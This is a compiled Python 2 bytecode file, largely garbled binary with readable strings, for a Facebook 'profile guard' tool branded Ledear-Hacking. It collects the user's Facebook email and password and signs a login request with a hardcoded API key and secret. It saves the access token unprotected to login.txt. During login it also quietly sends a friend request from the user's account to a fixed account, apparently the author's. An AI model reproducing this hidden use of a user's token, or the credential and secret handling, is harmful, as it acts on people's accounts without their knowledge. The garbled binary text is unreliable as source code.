ó
æÿD^c           @   sÕ  d  d l  Z  d  d l Z d  d l Z d  d l Z d  d l m Z y d  d l Z Wn e k
 rp e j d  n Xy d  d l	 Z	 Wn e k
 r¡ e j d  n Xd  d l
 m Z d  d l m Z e e   e  j d  e j   Z e j e  e j e j j   d d	 d g e _ d   Z d   Z d   Z d   Z d   Z d Z d   Z d   Z d   Z d   Z d   Z  e! d  Z" y e   Wn' e# k
 rºd GHd GHd GHe   n Xe$ d k rÑe   n  d S(   iÿÿÿÿN(   t
   ThreadPools   pip2 install mechanizes   pip2 install requests(   t   ConnectionError(   t   Browsert   utf8t   max_timei   s
   User-AgentsW   Opera/9.80 (Android; Opera Mini/36.2.2254/119.132; U; id) Presto/2.12.423 Version/12.16c          C   s¢   d GHd GHt  d  }  |  d k s. |  d k rb t j d  d d GHd GHd d GHt j j   n< |  d	 k st d
 r t j d  t j j   t j d  n  d  S(   Nt    sf   [1;37mDO YOU WANT TO SAVE IOGIN INFORMATION [1;33m[[1;32mY[1;33m/[1;31mn[1;33m] [1;31m:[1;37m t   yt   Yt   clears   [1;34m-i(   sD   [1;37mSAVE IN [1;31m>>>>>  [1;32mlogin.txt [1;31m <<<<<<<[1;37mt   nt   saves   rm ~/login.txt(   t	   raw_inputt   ost   systemt   syst   exitt   systems(   R
   (    (    s   /sdcard/guard.pyt   keluar"   s    		c          C   sE   d }  x8 |  D]0 } t  j j |  t  j j   t j d  q Wd  S(   Ns,   [1;41m PLEASE  LOGIN  TO  CONTINUE  [1;40mg{®Gáz?(   R   t   stdoutt   writet   flusht   timet   sleep(   t   wordt   i(    (    s   /sdcard/guard.pyt   ex7   s
    c          C   sE   d }  x8 |  D]0 } t  j j |  t  j j   t j d  q Wd  S(   Ns6   [1;41m [1;37mPlease go online and try again  [1;40mg¸ëQ¸®?(   R   R   R   R   R   R   (   R   R   (    (    s   /sdcard/guard.pyt   line>   s
    c          C   sE   d }  x8 |  D]0 } t  j j |  t  j j   t j d  q Wd  S(   Ns1   

[1;41m[1;37m Wrong email or password  [1;40mg¸ëQ¸®?(   R   R   R   R   R   R   (   R   R   (    (    s   /sdcard/guard.pyt   filedE   s
    c         C   sC   x< |  d D]0 } t  j j |  t  j j   t j d  q Wd  S(   Ns   g¹?(   R   R   R   R   R   R   (   t   zt   e(    (    s   /sdcard/guard.pyt   jalanN   s    s9  [1;94m

                   `-/ohdmdy+-.`                                         
               `-/ohdmmmmmmmmmhs+-.`                                     
           `-/shdmmmmdyso:+shmmmmmhs+-.`                                 
      ``-/shmmmmmdys+oshd-  `-+shmmmmmhs+-.`                             
  `.-/shmmmmmdyo+oshmmNNm-      `-+shmmmmmhs+-.`                         
 `+hmmmmmhyo++shmmNNNNNNm-          `-+shmmmmmho                         
  yNmmyo++shmNNNNNNNNNNNm-              `-+smmNh`                        
 `hNmh.ymNNNNNNNNNNNNNNNm-                  hmNh`                        
 `hNmy.mNNNNNNNNNNNNNNNNm-                  ymNh`                        
  yNmy-mNNNNNNNNNNNNNNNNm-                  ymNh`                        
  yNmh-mNNNNNNNNNNNNNNNNm-                  hmNy                         
  oNmd-mNNNNNNNNNNNNNNNNm-                  dmNo                         
  .mNm/yNNNNNNNNNNNNNNNNm-                 :mNm.                         
   yNmy:mmmmmmmmmmmmmmmmm-                 smNh`                         
   :mmd..................+ooooooooooooooo/.dmN/                          
   `hNmo                 yNNNNNNNNNNNNNNN/+mNd`                          
    :mmm-                yNNNNNNNNNNNNNNh-dmm/                           
     oNmh`               hNNNNNNNNNNNNNm:ymNy`                           
     `hNmy`              hNNNNNNNNNNNNm/smNd.                            
      .hNmy`             yNNNNNNNNNNNm+smNd-                             
        .ymmd/`          yNNNNNNNNms+hmNh-                               
         `+mmmy-         yNNNNNNdo/smmms.                                
          `-ymmms:`      yNNNmh+/odmmh:`                                 
            `:hmmmh+-`   ymho/+ydmmd+`                                   
              `:ymmmdho:-/+oydmmmh+.                                     
                `-+hmmmmddmmmmds:`                                       
                    `-/shmmdyo:.`                                      
                       \snn/ [1;97m
                         âââââââââââââââââââââââ
                         â[1;96mDEVELOPER INFORMATIOM[1;97mâ
ââââââââââââââââââââââââââââââââââââââââââââââââ
â[1;93m [1;97mNAME     [1;91m:[1;92mLedear-Hacking[1;97m  [1;91m[[1;97mALZAEEM[1;91m][1;97m          â
â[1;93m [1;97mCOUNTRY  [1;91m:[1;92mIRAQ[1;97m                               â
â[1;93m [1;97mAGE      [1;91m:[1;92m18 years[1;97m                           â
â[1;93m [1;97mGITHUB   [1;91m:[1;92mhttps://github.com/Ledear-Hacker[1;97m   â
ââââââââââââââââââââââââââââââââââââââââââââââââc          C   sz   t  j d  t GHd GHd GHd GHt d  }  |  d k rC t   n3 |  d k rY t   n d d	 GHt j d
  t   d  S(   NR   s%   [1;91m[[1;97m1[1;91m][1;97m Logins$   [1;91m[[1;97m0[1;91m][1;97m Exits   [1;97ms%   [1;31mã[1;33mã[1;32mã[1;37mt   1t   0s/   [1;31m  ERROR  [1;33m  ERROR   [1;32m  ERRORi
   i   (	   R   R   t   logoR   t   loginR   R   R   t   masuk(   t   msuk(    (    s   /sdcard/guard.pyR#   }   s    

	c          C   sÊ  t  j d  y t d d  }  t   Wnt t f k
 rÅt GHd GHt   d GHd GHt d  } t	 j	 d  } y t
 j d  Wn" t j k
 r¨ t   t   n Xt t
 j _ t
 j d d	  | t
 j d
 <| t
 j d <t
 j   t
 j   } d | k rKy!d | d | d } i d d 6d d 6| d
 6d d 6d d 6d d 6d d 6d d 6| d 6d d 6d d  6} t j d!  } | j |  | j   } | j i | d" 6 d# } t j | d$ | } t j | j  }	 t d d%  }
 |
 j |	 d&  |
 j    d' GHt j! d( |	 d&  t   WqKt j" j# k
 rGd) GHt   qKXn  d* | k rd+ GHt  j d,  t$ j% d-  t   qÆt&   t$ j% d.  t  j d  t  j d,  t$ j% d/  t'   n Xd  S(0   NR   s	   login.txtt   rt    s-   [1;91m[[1;37mEMAIL[1;91m] [1;91m:[1;92m s0   [1;31m[[1;37mPASSWORD[1;31m] [1;91m:[1;92m s   https://m.facebook.comt   nri    t   emailt   passs   save-devicesG   api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=s`   format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=s;   return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32t    882a8490361da98702bf97a021ddc14dt   api_keyt   passwordt   credentials_typet   JSONt   formatR   t   generate_machine_idt   generate_session_cookiest   en_USt   locales
   auth.logint   methodR    t   return_ssl_resourcess   1.0t   vt   md5t   sigs'   https://api.facebook.com/restserver.phpt   paramst   wt   access_tokens5   
[1;91m[[1;96mâ[1;91m] [1;92mLogin successfullysM   https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=s   
[1;91m[!] No connectiont
   checkpoints%   
[1;91m[!] [1;93mAccount Checkpoints   rm -rf login.txti   i   g{®Gáz?((   R   R   t   opent   menut   KeyErrort   IOErrorR!   R   R   t   getpasst   brt	   mechanizet   URLErrorR   R   t   Truet   _factoryt   is_htmlt   select_formt   formt   submitt   geturlt   hashlibt   newt   updatet	   hexdigestt   requestst   gett   jsont   loadst   textR   t   closet   postt
   exceptionsR   R   R   R   R"   (   t   tokett   idt   pwdt   urlR8   t   datat   xt   aR%   R   t   zedd(    (    s   /sdcard/guard.pyR"      sl    
S

c          C   s  y t  d d  j   }  Wn7 t k
 rR d GHt j d  t j d  t   n Xy= t j	 d |   } t
 j | j  } | d } | d } Wnh t k
 rÉ d	 GHt j d  t j d  t   n2 t j j k
 rú t   t j d
  t   n Xt j d  t GHt   d  S(   Ns	   login.txtR%   s   [1;91m[!] Token not founds   rm -rf login.txtg{®Gáz?s+   https://graph.facebook.com/me?access_token=t   nameRY   s$   [1;91m[!] [1;93mAccount Checkpointi   t   reset(   R=   t   readR@   R   R   R   R   R"   RP   RQ   RR   RS   RT   R?   RW   R   R   R   R!   t   guard(   RX   t   otwR^   t   namaRY   (    (    s   /sdcard/guard.pyR>   Ô   s0    

c          C   s   t  j d  y t d d  j   a Wn7 t k
 r_ d GHt  j d  t j d  t   n Xt	 GHd GHd GHd	 GHd
 GHt
 d  }  |  d k r§ d } t t |  nU |  d k rÉ d } t t |  n3 |  d k rß t   n |  d
 k rõ t   n t   d  S(   NR   s	   login.txtR%   s   [1;91m[!] Token not founds   rm -rf login.txtg{®Gáz?s1   [1;91m[[1;97m1[1;91m][1;97m Activate a guard s3   [1;91m[[1;97m2[1;91m][1;97m Not activate guard s$   [1;91m[[1;97m0[1;91m][1;97m EXITR   s%   [1;31mã[1;33mã[1;32mã[1;37mR   t   truet   2t   falseR    (   R   R   R=   Rb   RX   R@   R   R   R"   R!   R   t   gazR   (   t   gt   aktift   non(    (    s   /sdcard/guard.pyRc   õ   s2    

c         C   s3   d |  } t  j |  } t j | j  } | d S(   Ns-   https://graph.facebook.com/me?access_token=%sRY   (   RP   RQ   RR   RS   RT   (   RX   R[   t   rest   uid(    (    s   /sdcard/guard.pyt
   get_userid  s    
c         C   sç   t  |   } d | t |  f } i d d 6d |  d 6} d } t j | d | d | } | j GHd	 | j k r t j d
  t GHd GHt d  t	   nF d | j k r× t j d
  t GHd GHt d  t	   n d GHt
   d  S(   Ns  variables={"0":{"is_shielded": %s,"session_id":"9b78191c-84fd-4ab6-b0aa-19b39f04a6bc","actor_id":"%s","client_mutation_id":"b0316dd6-3fd6-4beb-aed4-bb29c5dc64b0"}}&method=post&doc_id=1477043292367183&query_name=IsShieldedSetMutation&strip_defaults=true&strip_nulls=true&locale=en_US&client_country_code=US&fb_api_req_friendly_name=IsShieldedSetMutation&fb_api_caller_class=IsShieldedSetMutations!   application/x-www-form-urlencodeds   Content-Types   OAuth %st   Authorizations"   https://graph.facebook.com/graphqlR\   t   headerss   "is_shielded":trueR   s,   [1;91m[[1;96mDone [1;91m] [1;92mActivates   [1;91m[ [1;97mBack [1;91m]s   "is_shielded":falses/   [1;91m[[1;92mDone[1;91m] [1;91mNot activates   [1;91m[!] Error(   Ro   t   strRP   RV   RT   R   R   R!   R   Rc   R   (   RX   t   enableRY   R\   Rq   R[   Rm   (    (    s   /sdcard/guard.pyRi     s(    



R   s'   [1;31m[[1;37m![1;31m][1;37mEXITING t   __main__(   s
   User-AgentsW   Opera/9.80 (Android; Opera Mini/36.2.2254/119.132; U; id) Presto/2.12.423 Version/12.16(%   R   R   R   RA   t   multiprocessing.poolR    RC   t   ImportErrorR   RP   t   requests.exceptionsR   R   t   reloadt   setdefaultencodingRB   t   set_handle_robotst   Falset   set_handle_refresht   _httpt   HTTPRefreshProcessort
   addheadersR   R   R   R   R   R!   R#   R"   R>   Rc   Ro   RE   Ri   t   KeyboardInterruptt   __name__(    (    (    s   /sdcard/guard.pyt   <module>   sR   	
						+		C	!	 	